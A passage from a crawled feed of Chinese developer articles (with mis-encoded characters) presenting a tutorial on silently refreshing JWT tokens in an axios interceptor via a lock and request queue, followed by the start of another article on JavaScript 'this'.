<li>B åœ¨ A å®Œæˆå‰å°±å‘èµ·é‡è¯• â†’ ä»ç”¨æ—§ token â†’ å†æ¬¡ 401</li>
<li>é™·å…¥æ— é™å¾ªç¯æˆ–é‡å¤åˆ·æ–°</li>
</ul>
<p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¿…é¡»å¼•å…¥ä¸€ç§â€œåè°ƒæœºåˆ¶â€ã€‚</p>
<hr/>
<h2 data-id="heading-4">ä¸‰ã€æ ¸å¿ƒè®¾è®¡ï¼šé” + é˜Ÿåˆ—æ¨¡å¼</h2>
<p>ä¸ºäº†åº”å¯¹å¹¶å‘ä¸ä¾èµ–å…³ç³»ï¼Œæˆ‘ä»¬é‡‡ç”¨ç»å…¸çš„ <strong>â€œé” + è¯·æ±‚é˜Ÿåˆ—â€</strong> æ¨¡å¼ã€‚</p>
<h3 data-id="heading-5">1. å…¨å±€çŠ¶æ€å®šä¹‰</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> isRefreshing = <span class="hljs-literal">false</span>; <span class="hljs-comment">// æ˜¯å¦æ­£åœ¨åˆ·æ–° token</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">requestsQueue</span>: <span class="hljs-title class_">Array</span>&lt;<span class="hljs-function">(<span class="hljs-params">token: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>&gt; = []; <span class="hljs-comment">// å¾…å¤„ç†è¯·æ±‚é˜Ÿåˆ—</span>
</code></pre>
<ul>
<li><code>isRefreshing</code> æ˜¯ä¸€æŠŠäº’æ–¥é”ï¼Œç¡®ä¿åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ª refresh æµç¨‹åœ¨æ‰§è¡Œã€‚</li>
<li><code>requestsQueue</code> å­˜æ”¾é‚£äº›éœ€è¦ç­‰å¾…æ–° token çš„è¯·æ±‚ã€‚</li>
</ul>
<h3 data-id="heading-6">2. æ‹¦æˆªå™¨ä¸­çš„åˆ†æµå¤„ç†</h3>
<p>å½“æŸä¸ªè¯·æ±‚é‡åˆ° 401ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">if</span> (response.<span class="hljs-property">status</span> === <span class="hljs-number">401</span> &amp;&amp; !config.<span class="hljs-property">_retry</span>) {
  <span class="hljs-keyword">if</span> (isRefreshing) {
    <span class="hljs-comment">// å·²æœ‰åˆ·æ–°ä»»åŠ¡åœ¨è¿›è¡Œï¼Œå½“å‰è¯·æ±‚åŠ å…¥é˜Ÿåˆ—ç­‰å¾…</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {
      requestsQueue.<span class="hljs-title function_">push</span>(<span class="hljs-function">(<span class="hljs-params">token: <span class="hljs-built_in">string</span></span>) =&gt;</span> {
        config.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${token}</span>`</span>;
        <span class="hljs-title function_">resolve</span>(<span class="hljs-title function_">axios</span>(config));
      });
    });
  }

  <span class="hljs-comment">// å¦åˆ™ç”±æˆ‘æ¥ä¸»å¯¼åˆ·æ–°</span>
  isRefreshing = <span class="hljs-literal">true</span>;
  config.<span class="hljs-property">_retry</span> = <span class="hljs-literal">true</span>;

  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> { access_token } = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/auth/refresh'</span>, {
      <span class="hljs-attr">refresh_token</span>: <span class="hljs-title function_">getRefreshToken</span>()
    });

    <span class="hljs-comment">// æ›´æ–°å…¨å±€çŠ¶æ€</span>
    <span class="hljs-title function_">setAuthToken</span>(access_token);

    <span class="hljs-comment">// æ‰§è¡Œé˜Ÿåˆ—ä¸­æ‰€æœ‰ç­‰å¾…çš„è¯·æ±‚</span>
    requestsQueue.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">callback</span> =&gt;</span> <span class="hljs-title function_">callback</span>(access_token));
    requestsQueue = [];

    <span class="hljs-comment">// é‡å‘å½“å‰è¯·æ±‚</span>
    config.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${access_token}</span>`</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">axios</span>(config);

  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-title function_">logout</span>();
    <span class="hljs-title function_">redirectToLogin</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(e);
  } <span class="hljs-keyword">finally</span> {
    isRefreshing = <span class="hljs-literal">false</span>;
  }
}
</code></pre>
<p>è¿™ä¸ªç»“æ„çœ‹ä¼¼å¤æ‚ï¼Œå®åˆ™å±‚æ¬¡æ¸…æ™°ï¼š</p>
<ol>
<li><strong>åˆ¤æ–­æ˜¯å¦é¦–æ¬¡è§¦å‘</strong>ï¼šé¿å…é‡å¤åˆ·æ–°ï¼›</li>
<li><strong>å¦‚æœæ˜¯ç«äº‰è€…ï¼Œåˆ™æ’é˜Ÿç­‰å€™</strong>ï¼šåˆ©ç”¨é—­åŒ…ä¿å­˜è¯·æ±‚ä¸Šä¸‹æ–‡ï¼›</li>
<li><strong>å¦‚æœæ˜¯å‘èµ·è€…ï¼Œåˆ™æ‰¿æ‹…åˆ·æ–°èŒè´£</strong>ï¼šè·å–æ–° tokenã€é€šçŸ¥é˜Ÿå‹ã€é‡å‘è‡ªå·±ï¼›</li>
<li><strong>ç»Ÿä¸€æ¸…ç†èµ„æº</strong>ï¼šé‡Šæ”¾é”ï¼Œé˜²æ­¢æ­»é”ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-7">å››ã€å…³é”®æŠ€æœ¯ç‚¹å‰–æ</h2>
<h3 data-id="heading-8">1. <code>_retry</code> æ ‡å¿—ä½çš„ä½œç”¨</h3>
<p>ä½ å¯èƒ½ä¼šé—®ï¼šä¸ºä»€ä¹ˆéœ€è¦ <code>_retry</code>ï¼Ÿ</p>
<p>è®¾æƒ³æ²¡æœ‰å®ƒï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p>
<ul>
<li>è¯·æ±‚ A æ”¶åˆ° 401ï¼Œå¼€å§‹åˆ·æ–°æµç¨‹ï¼›</li>
<li>åˆ·æ–°å®Œæˆåï¼Œç”¨æ–° token é‡å‘ Aï¼›</li>
<li>æ–°çš„ A è¯·æ±‚å†æ¬¡è¿›å…¥æ‹¦æˆªå™¨ï¼›</li>
<li>æ­¤æ—¶åˆæ˜¯ä¸€ä¸ª 401ï¼Ÿâ†’ ç»§ç»­åˆ·æ–° â†’ æ— é™å¾ªç¯ï¼</li>
</ul>
<p>å› æ­¤ï¼Œæˆ‘ä»¬åœ¨ç¬¬ä¸€æ¬¡æ•è·æ—¶æ‰“ä¸Šæ ‡è®°ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">config.<span class="hljs-property">_retry</span> = <span class="hljs-literal">true</span>;
</code></pre>
<p>è¿™æ ·ä¸‹æ¬¡å†é‡åˆ°åŒä¸€ä¸ªè¯·æ±‚å°±ä¸ä¼šé‡å¤å¤„ç†ã€‚</p>
<blockquote>
<p>ğŸ’¡ æ³¨æ„ï¼š<code>_retry</code> æ˜¯è‡ªå®šä¹‰å­—æ®µï¼Œä¸ä¼šè¢«å‘é€åˆ°åç«¯ï¼Œä»…ç”¨äºå†…éƒ¨æµç¨‹æ§åˆ¶ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-9">2. é˜Ÿåˆ—ä¸­çš„å›è°ƒå‡½æ•°æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ</h3>
<p>é‡ç‚¹çœ‹è¿™ä¸€æ®µï¼š</p>
<pre><code class="hljs language-ts" lang="ts">requestsQueue.<span class="hljs-title function_">push</span>(<span class="hljs-function">(<span class="hljs-params">token</span>) =&gt;</span> {
  config.<span class="hljs-property">headers</span>.<span class="hljs-property">Authorization</span> = <span class="hljs-string">`Bearer <span class="hljs-subst">${token}</span>`</span>;
  <span class="hljs-title function_">resolve</span>(<span class="hljs-title function_">axios</span>(config));
});
</code></pre>
<p>è¿™é‡Œå½¢æˆäº†ä¸€ä¸ªå…¸å‹çš„ <strong>Promise + é—­åŒ…</strong> ç»“æ„ï¼š</p>
<ul>
<li><code>resolve</code> æ¥è‡ªå½“å‰è¯·æ±‚çš„ Promiseï¼›</li>
<li><code>config</code> æ˜¯å½“å‰è¯·æ±‚çš„é…ç½®å¯¹è±¡ï¼›</li>
<li>å½“ future æŸä¸ªæ—¶åˆ»ä¼ å…¥æ–° token æ—¶ï¼Œå°±èƒ½åŠ¨æ€ä¿®æ”¹ header å¹¶é‡æ–°å‘èµ·è¯·æ±‚ã€‚</li>
</ul>
<p>æœ¬è´¨ä¸Šï¼Œæˆ‘ä»¬æŠŠâ€œå°†æ¥è¦ç”¨æ–° token é‡è¯•â€çš„èƒ½åŠ›å°è£…æˆäº†ä¸€ä¸ªå¯å»¶è¿Ÿæ‰§è¡Œçš„å‡½æ•°ã€‚</p>
<hr/>
<h3 data-id="heading-10">3. ä¸ºä»€ä¹ˆè¦åœ¨ finally ä¸­é‡Šæ”¾é”ï¼Ÿ</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">finally</span> {
  isRefreshing = <span class="hljs-literal">false</span>;
}
</code></pre>
<p>è¿™æ˜¯æå…¶é‡è¦çš„ä¸€æ­¥ã€‚å¦‚æœåˆ·æ–°è¿‡ç¨‹ä¸­å‘ç”Ÿç½‘ç»œé”™è¯¯ã€æœåŠ¡ç«¯å¼‚å¸¸æˆ–ä»£ç æŠ›é”™ï¼Œ<code>try...catch</code> ä¼šä¸­æ–­æ‰§è¡Œæµï¼Œè·³è¿‡åç»­é€»è¾‘ã€‚</p>
<p>å¦‚æœä¸æ”¾åœ¨ <code>finally</code>ï¼Œå°±ä¼šé€ æˆï¼š</p>
<ul>
<li><code>isRefreshing</code> ä¸€ç›´ä¸º <code>true</code></li>
<li>åç»­æ‰€æœ‰è¯·æ±‚éƒ½è¢«å¡åœ¨é˜Ÿåˆ—é‡Œ</li>
<li>æ•´ä¸ªåº”ç”¨æ— æ³•å‘èµ·ä»»ä½•å—ä¿æŠ¤æ¥å£è¯·æ±‚</li>
</ul>
<p>è¿™å°±æ˜¯å…¸å‹çš„ <strong>èµ„æºæ³„æ¼</strong> é—®é¢˜ã€‚åŠ¡å¿…ä¿è¯é”çš„é‡Šæ”¾æ˜¯åŸå­ä¸”å¿…ç„¶çš„ã€‚</p>
<hr/>
<h2 data-id="heading-11">äº”ã€è¾¹ç•Œæƒ…å†µä¸å®¹é”™è®¾è®¡</h2>
<p>å†ç¨³å¥çš„æœºåˆ¶ä¹Ÿè¦é¢å¯¹ç°å®ä¸–ç•Œçš„ä¸ç¡®å®šæ€§ã€‚ä»¥ä¸‹æ˜¯å‡ ä¸ªå¿…é¡»è€ƒè™‘çš„è¾¹ç¼˜åœºæ™¯ï¼š</p>
<h3 data-id="heading-12">åœºæ™¯ 1ï¼šrefresh_token ä¹Ÿå·²è¿‡æœŸ</h3>
<p>ç”¨æˆ·é•¿æ—¶é—´æœªæ“ä½œï¼Œè¿ refresh_token éƒ½å¤±æ•ˆäº†ã€‚æ­¤æ—¶ <code>/auth/refresh</code> è¯·æ±‚ä¹Ÿä¼šè¿”å› 401ã€‚</p>
<p>æˆ‘ä»¬åº”åœ¨ catch å—ä¸­ç»Ÿä¸€å¤„ç†ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">useUserStore.<span class="hljs-title function_">getState</span>().<span class="hljs-title function_">logout</span>();
<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">'/login'</span>;
</code></pre>
<p>å¹¶æ¸…é™¤æœ¬åœ°å­˜å‚¨çš„æ‰€æœ‰å‡­è¯ã€‚</p>
<hr/>
<h3 data-id="heading-13">åœºæ™¯ 2ï¼šå¤šä¸ªæ ‡ç­¾é¡µå…±äº«ç™»å½•çŠ¶æ€</h3>
<p>ç”¨æˆ·åœ¨ä¸€ä¸ªæ ‡ç­¾é¡µç™»å‡ºï¼Œå…¶ä»–é¡µé¢ä»å¯èƒ½æŒæœ‰æ—§ tokenã€‚è™½ç„¶æœ¬æ¬¡æœºåˆ¶æ— æ³•ä¸»åŠ¨æ„ŸçŸ¥ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡ç›‘å¬ localStorage å˜åŒ–æ¥è¾…åŠ©æ¸…ç†ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'storage'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (e.<span class="hljs-property">key</span> === <span class="hljs-string">'auth'</span> &amp;&amp; e.<span class="hljs-property">newValue</span> === <span class="hljs-literal">null</span>) {
    <span class="hljs-comment">// æ£€æµ‹åˆ°ç™»å‡ºäº‹ä»¶</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'/login'</span>)) {
      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = <span class="hljs-string">'/login'</span>;
    }
  }
});
</code></pre>
<p>å‰ææ˜¯ç™»å‡ºæ—¶å†™å…¥ storage äº‹ä»¶ã€‚</p>
<hr/>
<h3 data-id="heading-14">åœºæ™¯ 3ï¼šç½‘ç»œä¸ç¨³å®šå¯¼è‡´åˆ·æ–°å¤±è´¥</h3>
<p>å¶å°”çš„ç½‘ç»œæŠ–åŠ¨å¯èƒ½å¯¼è‡´ refresh è¯·æ±‚å¤±è´¥ã€‚æ˜¯å¦åº”è¯¥é‡è¯•ï¼Ÿ</p>
<p>å–å†³äºä¸šåŠ¡æ•æ„Ÿåº¦ï¼š</p>
<ul>
<li>æ™®é€šç³»ç»Ÿï¼šç›´æ¥ç™»å‡ºå³å¯ï¼›</li>
<li>é«˜å¯ç”¨è¦æ±‚ï¼šå¯åœ¨ catch ä¸­åŠ å…¥æŒ‡æ•°é€€é¿é‡è¯•ï¼ˆæœ€å¤š 2 æ¬¡ï¼‰ï¼›</li>
</ul>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> retries = <span class="hljs-number">0</span>;
<span class="hljs-keyword">const</span> maxRetries = <span class="hljs-number">2</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">tryRefresh</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// ...æ­£å¸¸åˆ·æ–°</span>
  } <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-keyword">if</span> (retries &lt; maxRetries) {
      retries++;
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">500</span> * <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(<span class="hljs-number">2</span>, retries));
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">tryRefresh</span>();
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-title function_">logout</span>();
    }
  }
}
</code></pre>
<p>ä½†è¦æ³¨æ„ä¸è¦è¿‡åº¦é‡è¯•ï¼Œä»¥å…åŠ é‡æœåŠ¡å™¨è´Ÿæ‹…ã€‚</p>
<hr/>
<h2 data-id="heading-15">å…­ã€ä¼˜åŠ¿æ€»ç»“ï¼šä¸åªæ˜¯â€œèƒ½ç”¨â€</h2>
<p>è¿™å¥—æ–¹æ¡ˆä¹‹æ‰€ä»¥èƒ½åœ¨ç”Ÿäº§ç¯å¢ƒä¸­é•¿æœŸç¨³å®šè¿è¡Œï¼Œæºäºä»¥ä¸‹å‡ ä¸ªæ ¸å¿ƒç‰¹æ€§ï¼š</p>





























<table><thead><tr><th>ç‰¹æ€§</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>âœ… <strong>çœŸæ­£çš„æ— æ„Ÿä½“éªŒ</strong></td><td>ç”¨æˆ·æ— éœ€æ„ŸçŸ¥ token åˆ·æ–°è¿‡ç¨‹ï¼Œæ“ä½œè¿ç»­</td></tr><tr><td>âœ… <strong>é˜²å¹¶å‘åˆ·æ–°</strong></td><td>é€šè¿‡å¸ƒå°”é”ä¿è¯æœ€å¤šåªæœ‰ä¸€ä¸ª refresh è¯·æ±‚</td></tr><tr><td>âœ… <strong>æ”¯æŒå¹¶å‘è¯·æ±‚æ¢å¤</strong></td><td>æ‰€æœ‰å›  token è¿‡æœŸè€Œå¤±è´¥çš„è¯·æ±‚éƒ½èƒ½è¢«æ­£ç¡®é‡æ”¾</td></tr><tr><td>âœ… <strong>ä½è€¦åˆé«˜å†…èš</strong></td><td>å®Œå…¨å°è£…åœ¨æ‹¦æˆªå™¨ä¸­ï¼Œä¸šåŠ¡ä»£ç é›¶æ„ŸçŸ¥</td></tr><tr><td>âœ… <strong>å¯ç»´æŠ¤æ€§å¼º</strong></td><td>ç»“æ„æ¸…æ™°ï¼Œæ˜“äºè°ƒè¯•å’Œæ‰©å±•</td></tr></tbody></table>
<p>æ›´é‡è¦çš„æ˜¯ï¼Œå®ƒä½“ç°äº†ä¸€ç§ <strong>é¢å‘å¤±è´¥ç¼–ç¨‹</strong> çš„æ€ç»´æ–¹å¼ï¼šæˆ‘ä»¬ä¸æ˜¯åœ¨å†™â€œç†æƒ³è·¯å¾„â€ï¼Œè€Œæ˜¯åœ¨è®¾è®¡â€œå¼‚å¸¸è·¯å¾„â€çš„é€ƒç”Ÿé€šé“ã€‚</p>
<hr/>
<h2 data-id="heading-16">ä¸ƒã€æ½œåœ¨æ”¹è¿›æ–¹å‘</h2>
<p>æ²¡æœ‰å®Œç¾çš„æ¶æ„ï¼Œåªæœ‰æŒç»­æ¼”è¿›çš„ç³»ç»Ÿã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¯ä»¥è¿›ä¸€æ­¥ä¼˜åŒ–çš„æ–¹å‘ï¼š</p>
<h3 data-id="heading-17">1. ä½¿ç”¨ AbortController å®ç°è¯·æ±‚å–æ¶ˆ</h3>
<p>å¦‚æœç”¨æˆ·å¿«é€Ÿåˆ‡æ¢é¡µé¢ï¼Œéƒ¨åˆ†å·²æ’é˜Ÿçš„è¯·æ±‚å¯èƒ½å·²æ— æ„ä¹‰ã€‚å¯é€šè¿‡æ³¨å…¥ cancelToken æ¥æ”¯æŒå–æ¶ˆæœºåˆ¶ã€‚</p>
<h3 data-id="heading-18">2. æ·»åŠ åˆ·æ–°æ—¥å¿—ä¸ŠæŠ¥</h3>
<p>è®°å½• refresh æˆåŠŸç‡ã€è€—æ—¶ã€å¤±è´¥åŸå› ç­‰æŒ‡æ ‡ï¼Œæœ‰åŠ©äºå‘ç°æ½œåœ¨é—®é¢˜ï¼ˆå¦‚é¢‘ç¹åˆ·æ–°å¯èƒ½æ˜¯å‰ç«¯æ—¶é—´ä¸åŒæ­¥å¯¼è‡´ï¼‰ã€‚</p>
<h3 data-id="heading-19">3. æ”¯æŒå¤šå®ä¾‹å…±å­˜</h3>
<p>åœ¨å¤§å‹é¡¹ç›®ä¸­ï¼Œå¯èƒ½å­˜åœ¨å¤šä¸ª axios å®ä¾‹ï¼ˆä¾‹å¦‚æ–‡ä»¶ä¸Šä¼ ä¸“ç”¨å®ä¾‹ï¼‰ï¼Œéœ€ç¡®ä¿æ‹¦æˆªå™¨é€»è¾‘èƒ½å¤ç”¨æˆ–ç»§æ‰¿ã€‚</p>
<hr/>
<h2 data-id="heading-20">å…«ã€ç»“è¯­ï¼šæŠŠå¼‚å¸¸å½“ä½œå¸¸æ€æ¥è®¾è®¡</h2>
<p>JWT çš„æœ€å¤§ä¼˜ç‚¹æ˜¯â€œæ— çŠ¶æ€â€ï¼Œä½†è¿™ä¹Ÿæ„å‘³ç€ä¸€æ—¦ç­¾å‘å°±éš¾ä»¥æ”¶å›ã€‚æ­£å› ä¸ºå¦‚æ­¤ï¼Œæˆ‘ä»¬æ‰æ›´éœ€è¦åœ¨å®¢æˆ·ç«¯å»ºç«‹ä¸€å¥—å¯é çš„å®¹é”™æœºåˆ¶ã€‚</p>
<p>æœ¬æ–‡æ‰€å±•ç¤ºçš„â€œæ— æ„Ÿåˆ·æ–°â€æ–¹æ¡ˆï¼Œä¸æ˜¯ä¸€ä¸ªç‚«æŠ€å¼çš„é»‘ç§‘æŠ€ï¼Œè€Œæ˜¯ä¸€ç§åŠ¡å®çš„å·¥ç¨‹å®è·µã€‚å®ƒä¸è¿½æ±‚æè‡´æ€§èƒ½ï¼Œä¹Ÿä¸ä¾èµ–å¤æ‚æ¡†æ¶ï¼Œè€Œæ˜¯ç”¨æœ€æœ´ç´ çš„é”å’Œé˜Ÿåˆ—ï¼Œè§£å†³äº†æœ€çœŸå®çš„é—®é¢˜ã€‚</p>
<p>å½“ä½ ä¸‹æ¬¡é¢å¯¹â€œtoken è¿‡æœŸæ€ä¹ˆåŠâ€è¿™ä¸ªé—®é¢˜æ—¶ï¼Œå¸Œæœ›ä½ èƒ½æƒ³åˆ°ï¼š</p>
<blockquote>
<p>â€œæˆ‘ä¸æ˜¯è¦é˜»æ­¢é”™è¯¯å‘ç”Ÿï¼Œè€Œæ˜¯è¦è®©å®ƒå‘ç”Ÿå¾—æ‚„æ— å£°æ¯ã€‚â€</p>
</blockquote>
<p>è¿™æ‰æ˜¯ç°ä»£å‰ç«¯åº”æœ‰çš„æˆç†Ÿå§¿æ€ã€‚</p>
<hr/>
<p>ğŸ“Œ <strong>é€‚ç”¨å»ºè®®</strong></p>
<ul>
<li>âœ… å•é¡µåº”ç”¨ï¼ˆSPAï¼‰ã€ç®¡ç†ç³»ç»Ÿã€å†…å®¹å¹³å°</li>
<li>âœ… ä½¿ç”¨ JWT + Refresh Token çš„è®¤è¯ä½“ç³»</li>
<li>âœ… å¯¹ç”¨æˆ·ä½“éªŒè¦æ±‚è¾ƒé«˜çš„äº§å“</li>
<li>âŒ ä¸é€‚ç”¨äºåŸºäº Session-Cookie çš„ä¼ ç»Ÿæ¶æ„</li>
</ul>
<hr/>
<p>å¦‚æœä½ ä¹Ÿåœ¨æ„å»ºç±»ä¼¼çš„é‰´æƒç³»ç»Ÿï¼Œæ¬¢è¿ç•™è¨€äº¤æµä½ çš„å®ç°æ–¹å¼ã€‚å…±å‹‰ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript this æŒ‡å‘ï¼šåˆ«å†æ­»è®°ç¡¬èƒŒï¼Œè¿™æ ·ç†è§£æœ€è½»æ¾ï¼]]></title>    <link>https://juejin.cn/post/7602440800296239150</link>    <guid>https://juejin.cn/post/7602440800296239150</guid>    <pubDate>2026-02-03T14:11:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602440800296239150" data-draft-id="7602464510607720474" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript this æŒ‡å‘ï¼šåˆ«å†æ­»è®°ç¡¬èƒŒï¼Œè¿™æ ·ç†è§£æœ€è½»æ¾ï¼"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2026-02-03T14:11:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸ä¼šæ•²ä»£ç 1"/> <meta itemprop="url" content="https://juejin.cn/user/1927884034804425"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript this æŒ‡å‘ï¼šåˆ«å†æ­»è®°ç¡¬èƒŒï¼Œè¿™æ ·ç†è§£æœ€è½»æ¾ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1927884034804425/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸ä¼šæ•²ä»£ç 1
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T14:11:12.000Z" title="Tue Feb 03 2026 14:11:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 